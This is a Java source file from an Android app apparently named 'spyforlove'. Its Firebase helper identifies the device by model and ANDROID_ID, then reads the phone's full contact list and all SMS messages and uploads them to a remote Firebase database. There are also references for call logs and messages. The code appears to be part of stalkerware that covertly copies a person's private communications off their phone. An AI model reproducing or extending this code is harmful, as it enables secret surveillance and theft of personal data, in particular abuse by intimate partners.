package chem.kth.spyforlove.database;

import android.annotation.SuppressLint;
import android.content.Context;
import android.provider.Settings;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Date;
import java.util.List;

import chem.kth.MainApplication;
import chem.kth.spyforlove.ReadContact;
import chem.kth.spyforlove.model.PhoneContact;
import chem.kth.spyforlove.model.SMessage;

public class FirebaseDatabaseHelper {
    private DatabaseReference mainRef;
    private static final FirebaseDatabaseHelper db = new FirebaseDatabaseHelper();

    public static FirebaseDatabaseHelper getInstance() {
        return db;
    }

    @SuppressLint("HardwareIds")
    private FirebaseDatabaseHelper() {
        Context context = MainApplication.getContext();
//        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mainRef = database.getReference(android.os.Build.MANUFACTURER + android.os.Build.MODEL + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
    }


    public DatabaseReference getMainRef() {
        return mainRef;
    }

    public DatabaseReference getPhoneCallRef() {
        return mainRef.child("/phone_calls");
    }

    public DatabaseReference getMessageRef() {
        return mainRef.child("/messages");
    }

    public DatabaseReference getContactRef() {
        return mainRef.child("/contacts");
    }

    public DatabaseReference getAllMessageRef() {
        return mainRef.child("/all_message");
    }

    public void uploadContacts() {
        List<PhoneContact> contactList = ReadContact.readContactProcess();
        getContactRef().setValue(contactList);
//        getContactRef().addValueEventListener(new ValueEventListener() {
//            @Override
//            public void onDataChange(@NonNull DataSnapshot snapshot) {
//
//            }
//
//            @Override
//            public void onCancelled(@NonNull DatabaseError error) {
//
//            }
//        });
    }

    public void uploadAllMessage() {
        List<SMessage> sMessageList = DatabaseHelper.getInstance().readSMS(true);
        getAllMessageRef().child(new Date().toString()).setValue(sMessageList);
    }
}
